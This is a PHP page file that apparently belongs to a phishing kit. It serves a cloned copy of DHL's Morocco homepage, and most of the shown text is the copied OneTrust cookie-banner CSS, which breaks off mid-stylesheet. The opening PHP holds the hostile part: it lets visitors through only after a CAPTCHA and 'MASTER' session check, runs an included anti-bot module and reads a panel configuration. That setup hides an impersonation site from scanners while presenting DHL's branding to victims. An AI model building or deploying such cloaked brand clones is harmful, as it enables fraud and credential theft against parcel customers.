<?php
session_start();
// Vérification de la session CAPTCHA
if (!isset($_SESSION['captcha']) || $_SESSION['captcha'] !== True) {
    header('Location: /'); // Redirige vers la page principale si le CAPTCHA n'est pas validé
    exit();
}

// Si le CAPTCHA est validé, le reste du code s'exécute normalement
include '../back/antibots.php';
include "Config/panel.php";
$configFile = $_SERVER['DOCUMENT_ROOT'] . '../help/!#/settings.json';




if (isset($_SESSION['MASTER'])) {

    antibotpw();
    require "lang.php";

?>
<!DOCTYPE html>
<!-- saved from url=(0035)https://www.dhl.com/ma-en/home.html -->
<html lang="en-MA" dir="ltr" base="ma-en" class="is-desktop js-global-newsflash-visible" data-di-loaded="1" data-analytics="true">

<head class="at-element-marker">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title><?php echo lang('xTitle');  ?></title>



    <link rel="preload" href="./styles/bundle.d071057f32870c8e483f9e1082373aab.css" as="style" crossorigin="">
    <link rel="preload" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-274a65bae9742377aaf0.woff" as="font" crossorigin="">
    <link rel="preload" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-3e828e80f6e985c352eb.woff" as="font" crossorigin="">
    <link rel="preload" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-5a6dd86f272b304a8b83.woff" as="font" crossorigin="">
    <link rel="preload" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/fonts/default-815fcbb4d2c579017011.woff" as="font" crossorigin="">
    <link rel="preload" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/fonts/iconfont-da52a17c1b8deb953bfe.woff" as="font" crossorigin="">


    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="DHL is the global leader in the logistics industry. Specializing in international shipping, courier services and transportation.
">

    <meta name="language" content="en-MA">
    <meta name="region" content="africa">


    <link rel="canonical" href="https://www.dhl.com/ma-en/home.html">


    <meta property="og:title" content="Global Logistics - International Shipping | DHL Home |">
    <meta property="og:site_name" content="DHL">
    <meta property="og:type" content="website">


    <meta property="og:url" content="https://www.dhl.com/ma-en/home.html">
    <meta property="og:description" content="DHL is the global leader in the logistics industry. Specializing in international shipping, courier services and transportation.
">
    <meta property="og:locale" content="en_MA">





    <meta name="section" content="dhl:section/core">
    <meta name="google-site-verification" content="Owvc_x6-UK2jS5AO7XJyp-7jV4VNI44HGdikZAK-ePU">

    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="default">
    <meta name="format-detection" content="telephone=no">
    <meta name="analyticsId" content="fac1f9e10eaedc34e3afaa735806cc49">

    <link rel="icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-57x57.png">
    <link rel="apple-touch-icon" sizes="76x76" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-76x76.png">
    <link rel="apple-touch-icon" sizes="120x120" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-120x120.png">
    <link rel="apple-touch-icon" sizes="180x180" href="https://www.dhl.com/etc/clientlibs/dhl/clientlib-all/assets/appletouch/apple-touch-icon-180x180.png">
    <link rel="stylesheet" href="./styles/bundle.d071057f32870c8e483f9e1082373aab.css">
    <link rel="stylesheet" href="./styles/clientlib-core.min.css" type="text/css">
    <script src="https://kit.fontawesome.com/2b0499d3bf.js" crossorigin="anonymous"></script>
    <style id="onetrust-style" data-di-track="1">
        #onetrust-banner-sdk {
            -ms-text-size-adjust: 100%;
            -webkit-text-size-adjust: 100%
        }
        
        #onetrust-banner-sdk .onetrust-vendors-list-handler {
            cursor: pointer;
            color: #1f96db;
            font-size: inherit;
            font-weight: bold;
            text-decoration: none;
            margin-left: 5px
        }
        
        #onetrust-banner-sdk .onetrust-vendors-list-handler:hover {
            color: #1f96db
        }
        
        #onetrust-banner-sdk:focus {
            outline: 2px solid #000;
            outline-offset: -2px
        }
        
        #onetrust-banner-sdk a:focus {
            outline: 2px solid #000
        }
        
        #onetrust-banner-sdk #onetrust-accept-btn-handler,
        #onetrust-banner-sdk #onetrust-reject-all-handler,
        #onetrust-banner-sdk #onetrust-pc-btn-handler {
            outline-offset: 1px
        }
        
        #onetrust-banner-sdk.ot-bnr-w-logo .ot-bnr-logo {
            height: 64px;
            width: 64px
        }
        
        #onetrust-banner-sdk .ot-close-icon,
        #onetrust-pc-sdk .ot-close-icon,
        #ot-sync-ntfy .ot-close-icon {
            background-image: url("data:image/svg+xml;base64,PHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4IiB3aWR0aD0iMzQ4LjMzM3B4IiBoZWlnaHQ9IjM0OC4zMzNweCIgdmlld0JveD0iMCAwIDM0OC4zMzMgMzQ4LjMzNCIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzQ4LjMzMyAzNDguMzM0OyIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+PGc+PHBhdGggZmlsbD0iIzU2NTY1NiIgZD0iTTMzNi41NTksNjguNjExTDIzMS4wMTYsMTc0LjE2NWwxMDUuNTQzLDEwNS41NDljMTUuNjk5LDE1LjcwNSwxNS42OTksNDEuMTQ1LDAsNTYuODVjLTcuODQ0LDcuODQ0LTE4LjEyOCwxMS43NjktMjguNDA3LDExLjc2OWMtMTAuMjk2LDAtMjAuNTgxLTMuOTE5LTI4LjQxOS0xMS43NjlMMTc0LjE2NywyMzEuMDAzTDY4LjYwOSwzMzYuNTYzYy03Ljg0Myw3Ljg0NC0xOC4xMjgsMTEuNzY5LTI4LjQxNiwxMS43NjljLTEwLjI4NSwwLTIwLjU2My0zLjkxOS0yOC40MTMtMTEuNzY5Yy0xNS42OTktMTUuNjk4LTE1LjY5OS00MS4xMzksMC01Ni44NWwxMDUuNTQtMTA1LjU0OUwxMS43NzQsNjguNjExYy0xNS42OTktMTUuNjk5LTE1LjY5OS00MS4xNDUsMC01Ni44NDRjMTUuNjk2LTE1LjY4Nyw0MS4xMjctMTUuNjg3LDU2LjgyOSwwbDEwNS41NjMsMTA1LjU1NEwyNzkuNzIxLDExLjc2N2MxNS43MDUtMTUuNjg3LDQxLjEzOS0xNS42ODcsNTYuODMyLDBDMzUyLjI1OCwyNy40NjYsMzUyLjI1OCw1Mi45MTIsMzM2LjU1OSw2OC42MTF6Ii8+PC9nPjwvc3ZnPg==");
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 12px;
            width: 12px
        }
        
        #onetrust-banner-sdk .powered-by-logo,
        #onetrust-banner-sdk .ot-pc-footer-logo a,
        #onetrust-pc-sdk .powered-by-logo,
        #onetrust-pc-sdk .ot-pc-footer-logo a,
        #ot-sync-ntfy .powered-by-logo,
        #ot-sync-ntfy .ot-pc-footer-logo a {
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            height: 25px;
            width: 152px;
            display: block;
            text-decoration: none;
            font-size: 0.75em
        }
        
        #onetrust-banner-sdk .powered-by-logo:hover,
        #onetrust-banner-sdk .ot-pc-footer-logo a:hover,
        #onetrust-pc-sdk .powered-by-logo:hover,
        #onetrust-pc-sdk .ot-pc-footer-logo a:hover,
        #ot-sync-ntfy .powered-by-logo:hover,
        #ot-sync-ntfy .ot-pc-footer-logo a:hover {
            color: #565656
        }
        
        #onetrust-banner-sdk h3 *,
        #onetrust-banner-sdk h4 *,
        #onetrust-banner-sdk h6 *,
        #onetrust-banner-sdk button *,
        #onetrust-banner-sdk a[data-parent-id] *,
        #onetrust-pc-sdk h3 *,
        #onetrust-pc-sdk h4 *,
        #onetrust-pc-sdk h6 *,
        #onetrust-pc-sdk button *,
        #onetrust-pc-sdk a[data-parent-id] *,
        #ot-sync-ntfy h3 *,
        #ot-sync-ntfy h4 *,
        #ot-sync-ntfy h6 *,
        #ot-sync-ntfy button *,
        #ot-sync-ntfy a[data-parent-id] * {
            font-size: inherit;
            font-weight: inherit;
            color: inherit
        }
        
        #onetrust-banner-sdk .ot-hide,
        #onetrust-pc-sdk .ot-hide,
        #ot-sync-ntfy .ot-hide {
            display: none !important
        }
        
        #onetrust-banner-sdk button.ot-link-btn:hover,
        #onetrust-pc-sdk button.ot-link-btn:hover,
        #ot-sync-ntfy button.ot-link-btn:hover {
            text-decoration: underline;
            opacity: 1
        }
        
        #onetrust-pc-sdk .ot-sdk-row .ot-sdk-column {
            padding: 0
        }
        
        #onetrust-pc-sdk .ot-sdk-container {
            padding-right: 0
        }
        
        #onetrust-pc-sdk .ot-sdk-row {
            flex-direction: initial;
            width: 100%
        }
        
        #onetrust-pc-sdk [type="checkbox"]:checked,
        #onetrust-pc-sdk [type="checkbox"]:not(:checked) {
            pointer-events: initial
        }
        
        #onetrust-pc-sdk [type="checkbox"]:disabled+label::before,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label:after,
        #onetrust-pc-sdk [type="checkbox"]:disabled+label {
            pointer-events: none;
            opacity: 0.7
        }
        
        #onetrust-pc-sdk #vendor-list-content {
            transform: translate3d(0, 0, 0)
        }
        
        #onetrust-pc-sdk li input[type="checkbox"] {
            z-index: 1
        }
        
        #onetrust-pc-sdk li .ot-checkbox label {
            z-index: 2
        }
        
        #onetrust-pc-sdk li .ot-checkbox input[type="checkbox"] {
            height: auto;
            width: auto
        }
        
        #onetrust-pc-sdk li .host-title a,
        #onetrust-pc-sdk li .ot-host-name a,
        #onetrust-pc-sdk li .accordion-text,
        #onetrust-pc-sdk li .ot-acc-txt {
            z-index: 2;
            position: relative
        }
        
        #onetrust-pc-sdk input {
            margin: 3px 0.1ex
        }
        
        #onetrust-pc-sdk .pc-logo,
        #onetrust-pc-sdk .ot-pc-logo {
            height: 60px;
            width: 180px;
            background-position: center;
            background-size: contain;
            background-repeat: no-repeat
        }
        
        #onetrust-pc-sdk .screen-reader-only,
        #onetrust-pc-sdk .ot-scrn-rdr,
        .ot-sdk-cookie-policy .screen-reader-only,
        .ot-sdk-cookie-policy .ot-scrn-rdr {
            border: 0;
            clip: rect(0 0 0 0);
            height: 1px;
            margin: -1px;
            overflow: hidden;
            padding: 0;
            position: absolute;
            width: 1px
        }
        
        #onetrust-pc-sdk.ot-fade-in,
        .onetrust-pc-dark-filter.ot-fade-in,
        #onetrust-banner-sdk.ot-fade-in {
            animation-name: onetrust-fade-in;
            animation-duration: 400ms;
            animation-timing-function: ease-in-out
        }
        
        #onetrust-pc-sdk.ot-hide {
            display: none !important
        }
        
        .onetrust-pc-dark-filter.ot-hide {
            display: none !important
        }
        
        #ot-sdk-btn.ot-sdk-show-settings,
        #ot-sdk-btn.optanon-show-settings {
            color: #68b631;
            border: 1px solid #68b631;
            height: auto;
            white-space: normal;
            word-wrap: break-word;
            padding: 0.8em 2em;
            font-size: 0.8em;
            line-height: 1.2;
            cursor: pointer;
            -moz-transition: 0.1s ease;
            -o-transition: 0.1s ease;
            -webkit-transition: 1s ease;
            transition: 0.1s ease
        }
        
        #ot-sdk-btn.ot-sdk-show-settings:hover,
        #ot-sdk-btn.optanon-show-settings:hover {
            color: #fff;
            background-color: #68b631
        }
        
        .onetrust-pc-dark-filter {
            background: rgba(0, 0, 0, 0.5);
            z-index: 2147483646;
            width: 100%;
            height: 100%;
            overflow: hidden;
            position: fixed;
            top: 0;
            bottom: 0;
            left: 0
        }
        
        @keyframes onetrust-fade-in {
            0% {
                opacity: 0
            }
            100% {
                opacity: 1
            }
        }
        
        .ot-cookie-label {
            text-decoration: underline
        }
        
        @media only screen and (min-width: 426px) and (max-width: 896px) and (orientation: landscape) {
            #onetrust-pc-sdk p {
                font-size: 0.75em
            }
        }
        
        #onetrust-banner-sdk .banner-option-input:focus+label {
            outline: 1px solid #000;
            outline-style: auto
        }
        
        .category-vendors-list-handler+a:focus,
        .category-vendors-list-handler+a:focus-visible {
            outline: 2px solid #000
        }
        
        #onetrust-pc-sdk .ot-userid-title {
            margin-top: 10px
        }
        
        #onetrust-pc-sdk .ot-userid-title>span,
        #onetrust-pc-sdk .ot-userid-timestamp>span {
            font-weight: 700
        }
        
        #onetrust-pc-sdk .ot-userid-desc {
            font-style: italic
        }
        
        #onetrust-pc-sdk .ot-host-desc a {
            pointer-events: initial
        }
        
        #onetrust-pc-sdk .ot-ven-hdr>p a {
            position: relative;
            z-index: 2;
            pointer-events: initial
        }
        
        #onetrust-pc-sdk .ot-vnd-serv .ot-vnd-item .ot-vnd-info a,
        #onetrust-pc-sdk .ot-vs-list .ot-vnd-item .ot-vnd-info a {
            margin-right: auto
        }
        
        #onetrust-banner-sdk,
        #onetrust-pc-sdk,
        #ot-sdk-cookie-policy,
        #ot-sync-ntfy {
            font-size: 16px
        }
        
        #onetrust-banner-sdk *,
        #onetrust-banner-sdk ::after,
        #onetrust-banner-sdk ::before,
        #onetrust-pc-sdk *,
        #onetrust-pc-sdk ::after,
        #onetrust-pc-sdk ::before,
        #ot-sdk-cookie-policy *,
        #ot-sdk-cookie-policy ::after,
        #ot-sdk-cookie-policy ::before,
        #ot-sync-ntfy *,
        #ot-sync-ntfy ::after,
        #ot-sync-ntfy ::before {
            -webkit-box-sizing: content-box;
            -moz-box-sizing: content-box;
            box-sizing: content-box
        }
        
        #onetrust-banner-sdk div,
        #onetrust-banner-sdk span,
        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-banner-sdk p,
        #onetrust-banner-sdk img,
        #onetrust-banner-sdk svg,
        #onetrust-banner-sdk button,
        #onetrust-banner-sdk section,
        #onetrust-banner-sdk a,
        #onetrust-banner-sdk label,
        #onetrust-banner-sdk input,
        #onetrust-banner-sdk ul,
        #onetrust-banner-sdk li,
        #onetrust-banner-sdk nav,
        #onetrust-banner-sdk table,
        #onetrust-banner-sdk thead,
        #onetrust-banner-sdk tr,
        #onetrust-banner-sdk td,
        #onetrust-banner-sdk tbody,
        #onetrust-banner-sdk .ot-main-content,
        #onetrust-banner-sdk .ot-toggle,
        #onetrust-banner-sdk #ot-content,
        #onetrust-banner-sdk #ot-pc-content,
        #onetrust-banner-sdk .checkbox,
        #onetrust-pc-sdk div,
        #onetrust-pc-sdk span,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #onetrust-pc-sdk p,
        #onetrust-pc-sdk img,
        #onetrust-pc-sdk svg,
        #onetrust-pc-sdk button,
        #onetrust-pc-sdk section,
        #onetrust-pc-sdk a,
        #onetrust-pc-sdk label,
        #onetrust-pc-sdk input,
        #onetrust-pc-sdk ul,
        #onetrust-pc-sdk li,
        #onetrust-pc-sdk nav,
        #onetrust-pc-sdk table,
        #onetrust-pc-sdk thead,
        #onetrust-pc-sdk tr,
        #onetrust-pc-sdk td,
        #onetrust-pc-sdk tbody,
        #onetrust-pc-sdk .ot-main-content,
        #onetrust-pc-sdk .ot-toggle,
        #onetrust-pc-sdk #ot-content,
        #onetrust-pc-sdk #ot-pc-content,
        #onetrust-pc-sdk .checkbox,
        #ot-sdk-cookie-policy div,
        #ot-sdk-cookie-policy span,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6,
        #ot-sdk-cookie-policy p,
        #ot-sdk-cookie-policy img,
        #ot-sdk-cookie-policy svg,
        #ot-sdk-cookie-policy button,
        #ot-sdk-cookie-policy section,
        #ot-sdk-cookie-policy a,
        #ot-sdk-cookie-policy label,
        #ot-sdk-cookie-policy input,
        #ot-sdk-cookie-policy ul,
        #ot-sdk-cookie-policy li,
        #ot-sdk-cookie-policy nav,
        #ot-sdk-cookie-policy table,
        #ot-sdk-cookie-policy thead,
        #ot-sdk-cookie-policy tr,
        #ot-sdk-cookie-policy td,
        #ot-sdk-cookie-policy tbody,
        #ot-sdk-cookie-policy .ot-main-content,
        #ot-sdk-cookie-policy .ot-toggle,
        #ot-sdk-cookie-policy #ot-content,
        #ot-sdk-cookie-policy #ot-pc-content,
        #ot-sdk-cookie-policy .checkbox,
        #ot-sync-ntfy div,
        #ot-sync-ntfy span,
        #ot-sync-ntfy h1,
        #ot-sync-ntfy h2,
        #ot-sync-ntfy h3,
        #ot-sync-ntfy h4,
        #ot-sync-ntfy h5,
        #ot-sync-ntfy h6,
        #ot-sync-ntfy p,
        #ot-sync-ntfy img,
        #ot-sync-ntfy svg,
        #ot-sync-ntfy button,
        #ot-sync-ntfy section,
        #ot-sync-ntfy a,
        #ot-sync-ntfy label,
        #ot-sync-ntfy input,
        #ot-sync-ntfy ul,
        #ot-sync-ntfy li,
        #ot-sync-ntfy nav,
        #ot-sync-ntfy table,
        #ot-sync-ntfy thead,
        #ot-sync-ntfy tr,
        #ot-sync-ntfy td,
        #ot-sync-ntfy tbody,
        #ot-sync-ntfy .ot-main-content,
        #ot-sync-ntfy .ot-toggle,
        #ot-sync-ntfy #ot-content,
        #ot-sync-ntfy #ot-pc-content,
        #ot-sync-ntfy .checkbox {
            font-family: inherit;
            font-weight: normal;
            -webkit-font-smoothing: auto;
            letter-spacing: normal;
            line-height: normal;
            padding: 0;
            margin: 0;
            height: auto;
            min-height: 0;
            max-height: none;
            width: auto;
            min-width: 0;
            max-width: none;
            border-radius: 0;
            border: none;
            clear: none;
            float: none;
            position: static;
            bottom: auto;
            left: auto;
            right: auto;
            top: auto;
            text-align: left;
            text-decoration: none;
            text-indent: 0;
            text-shadow: none;
            text-transform: none;
            white-space: normal;
            background: none;
            overflow: visible;
            vertical-align: baseline;
            visibility: visible;
            z-index: auto;
            box-shadow: none
        }
        
        #onetrust-banner-sdk label:before,
        #onetrust-banner-sdk label:after,
        #onetrust-banner-sdk .checkbox:after,
        #onetrust-banner-sdk .checkbox:before,
        #onetrust-pc-sdk label:before,
        #onetrust-pc-sdk label:after,
        #onetrust-pc-sdk .checkbox:after,
        #onetrust-pc-sdk .checkbox:before,
        #ot-sdk-cookie-policy label:before,
        #ot-sdk-cookie-policy label:after,
        #ot-sdk-cookie-policy .checkbox:after,
        #ot-sdk-cookie-policy .checkbox:before,
        #ot-sync-ntfy label:before,
        #ot-sync-ntfy label:after,
        #ot-sync-ntfy .checkbox:after,
        #ot-sync-ntfy .checkbox:before {
            content: "";
            content: none
        }
        
        #onetrust-banner-sdk .ot-sdk-container,
        #onetrust-pc-sdk .ot-sdk-container,
        #ot-sdk-cookie-policy .ot-sdk-container {
            position: relative;
            width: 100%;
            max-width: 100%;
            margin: 0 auto;
            padding: 0 20px;
            box-sizing: border-box
        }
        
        #onetrust-banner-sdk .ot-sdk-column,
        #onetrust-banner-sdk .ot-sdk-columns,
        #onetrust-pc-sdk .ot-sdk-column,
        #onetrust-pc-sdk .ot-sdk-columns,
        #ot-sdk-cookie-policy .ot-sdk-column,
        #ot-sdk-cookie-policy .ot-sdk-columns {
            width: 100%;
            float: left;
            box-sizing: border-box;
            padding: 0;
            display: initial
        }
        
        @media (min-width: 400px) {
            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 90%;
                padding: 0
            }
        }
        
        @media (min-width: 550px) {
            #onetrust-banner-sdk .ot-sdk-container,
            #onetrust-pc-sdk .ot-sdk-container,
            #ot-sdk-cookie-policy .ot-sdk-container {
                width: 100%
            }
            #onetrust-banner-sdk .ot-sdk-column,
            #onetrust-banner-sdk .ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-column,
            #onetrust-pc-sdk .ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-column,
            #ot-sdk-cookie-policy .ot-sdk-columns {
                margin-left: 4%
            }
            #onetrust-banner-sdk .ot-sdk-column:first-child,
            #onetrust-banner-sdk .ot-sdk-columns:first-child,
            #onetrust-pc-sdk .ot-sdk-column:first-child,
            #onetrust-pc-sdk .ot-sdk-columns:first-child,
            #ot-sdk-cookie-policy .ot-sdk-column:first-child,
            #ot-sdk-cookie-policy .ot-sdk-columns:first-child {
                margin-left: 0
            }
            #onetrust-banner-sdk .ot-sdk-two.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-two.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-two.ot-sdk-columns {
                width: 13.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-three.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-three.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-three.ot-sdk-columns {
                width: 22%
            }
            #onetrust-banner-sdk .ot-sdk-four.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-four.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-four.ot-sdk-columns {
                width: 30.6666666667%
            }
            #onetrust-banner-sdk .ot-sdk-eight.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eight.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eight.ot-sdk-columns {
                width: 65.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-nine.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-nine.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-nine.ot-sdk-columns {
                width: 74%
            }
            #onetrust-banner-sdk .ot-sdk-ten.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-ten.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-ten.ot-sdk-columns {
                width: 82.6666666667%
            }
            #onetrust-banner-sdk .ot-sdk-eleven.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-eleven.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-eleven.ot-sdk-columns {
                width: 91.3333333333%
            }
            #onetrust-banner-sdk .ot-sdk-twelve.ot-sdk-columns,
            #onetrust-pc-sdk .ot-sdk-twelve.ot-sdk-columns,
            #ot-sdk-cookie-policy .ot-sdk-twelve.ot-sdk-columns {
                width: 100%;
                margin-left: 0
            }
        }
        
        #onetrust-banner-sdk h1,
        #onetrust-banner-sdk h2,
        #onetrust-banner-sdk h3,
        #onetrust-banner-sdk h4,
        #onetrust-banner-sdk h5,
        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h1,
        #onetrust-pc-sdk h2,
        #onetrust-pc-sdk h3,
        #onetrust-pc-sdk h4,
        #onetrust-pc-sdk h5,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h1,
        #ot-sdk-cookie-policy h2,
        #ot-sdk-cookie-policy h3,
        #ot-sdk-cookie-policy h4,
        #ot-sdk-cookie-policy h5,
        #ot-sdk-cookie-policy h6 {
            margin-top: 0;
            font-weight: 600;
            font-family: inherit
        }
        
        #onetrust-banner-sdk h1,
        #onetrust-pc-sdk h1,
        #ot-sdk-cookie-policy h1 {
            font-size: 1.5rem;
            line-height: 1.2
        }
        
        #onetrust-banner-sdk h2,
        #onetrust-pc-sdk h2,
        #ot-sdk-cookie-policy h2 {
            font-size: 1.5rem;
            line-height: 1.25
        }
        
        #onetrust-banner-sdk h3,
        #onetrust-pc-sdk h3,
        #ot-sdk-cookie-policy h3 {
            font-size: 1.5rem;
            line-height: 1.3
        }
        
        #onetrust-banner-sdk h4,
        #onetrust-pc-sdk h4,
        #ot-sdk-cookie-policy h4 {
            font-size: 1.5rem;
            line-height: 1.35
        }
        
        #onetrust-banner-sdk h5,
        #onetrust-pc-sdk h5,
        #ot-sdk-cookie-policy h5 {
            font-size: 1.5rem;
            line-height: 1.5
        }
        
        #onetrust-banner-sdk h6,
        #onetrust-pc-sdk h6,
        #ot-sdk-cookie-policy h6 {
            font-size: 1.5rem;
            line-height: 1.6
        }
        
        @media (min-width: 550px) {
            #onetrust-banner-sdk h1,
            #onetrust-pc-sdk h1,
            #ot-sdk-cookie-policy h1 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h2,
            #onetrust-pc-sdk h2,
            #ot-sdk-cookie-policy h2 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h3,
            #onetrust-pc-sdk h3,
            #ot-sdk-cookie-policy h3 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h4,
            #onetrust-pc-sdk h4,
            #ot-sdk-cookie-policy h4 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h5,
            #onetrust-pc-sdk h5,
            #ot-sdk-cookie-policy h5 {
                font-size: 1.5rem
            }
            #onetrust-banner-sdk h6,
            #onetrust-pc-sdk h6,
            #ot-sdk-cookie-policy h6 {
                font-size: 1.5rem
            }
        }
        
        #onetrust-banner-sdk p,
        #onetrust-pc-sdk p,
        #ot-sdk-cookie-policy p {
            margin: 0 0 1em 0;
            font-family: inherit;
            line-height: normal
        }
        
        #onetrust-banner-sdk a,
        #onetrust-pc-sdk a,
        #ot-sdk-cookie-policy a {
            color: #565656;
            text-decoration: underline
        }
        
        #onetrust-banner-sdk a:hover,
        #onetrust-pc-sdk a:hover,
        #ot-sdk-cookie-policy a:hover {
            color: #565656;
            text-decoration: none
        }
        
        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            margin-bottom: 1rem;
            font-family: inherit
        }
        
        #onetrust-banner-sdk .ot-sdk-button,
        #onetrust-banner-sdk button,
        #onetrust-pc-sdk .ot-sdk-button,
        #onetrust-pc-sdk button,
        #ot-sdk-cookie-policy .ot-sdk-button,
        #ot-sdk-cookie-policy button {
            display: inline-block;
            height: 38px;
            padding: 0 30px;
            color: #555;
            text-align: center;
            font-size: 0.9em;
            font-weight: 400;
            line-height: 38px;
            letter-spacing: 0.01em;
            text-decoration: none;
            white-space: nowrap;
            background-color: transparent;
            border-radius: 2px;
            border: 1px solid #bbb;
            cursor: pointer;
            box-sizing: border-box
        }
        
        #onetrust-banner-sdk .ot-sdk-button:hover,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
        #onetrust-pc-sdk .ot-sdk-button:hover,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus,
        #ot-sdk-cookie-policy .ot-sdk-button:hover,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):hover,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:not(.ot-link-btn):focus {
            color: #333;
            border-color: #888;
            opacity: 0.7
        }
        
        #onetrust-banner-sdk .ot-sdk-button:focus,
        #onetrust-banner-sdk :not(.ot-leg-btn-container)>button:focus,
        #onetrust-pc-sdk .ot-sdk-button:focus,
        #onetrust-pc-sdk :not(.ot-leg-btn-container)>button:focus,
        #ot-sdk-cookie-policy .ot-sdk-button:focus,
        #ot-sdk-cookie-policy :not(.ot-leg-btn-container)>button:focus {
            outline: 2px solid #000
        }
        
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-banner-sdk button.ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary,
        #onetrust-pc-sdk button.ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="submit"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="reset"].ot-sdk-button-primary,
        #onetrust-pc-sdk input[type="button"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy .ot-sdk-button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy button.ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="submit"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="reset"].ot-sdk-button-primary,
        #ot-sdk-cookie-policy input[type="button"].ot-sdk-button-primary {
            color: #fff;
            background-color: #33c3f0;
            border-color: #33c3f0
        }
        
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk button.ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:hover,
        #onetrust-banner-sdk .ot-sdk-button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk button.ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="submit"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="reset"].ot-sdk-button-primary:focus,
        #onetrust-banner-sdk input[type="button"].ot-sdk-button-primary:focus,
        #onetrust-pc-sdk .ot-sdk-button.ot-sdk-button-primary:hover,
        #onetrust-pc-sdk button.ot-sdk-button-primary:hover,
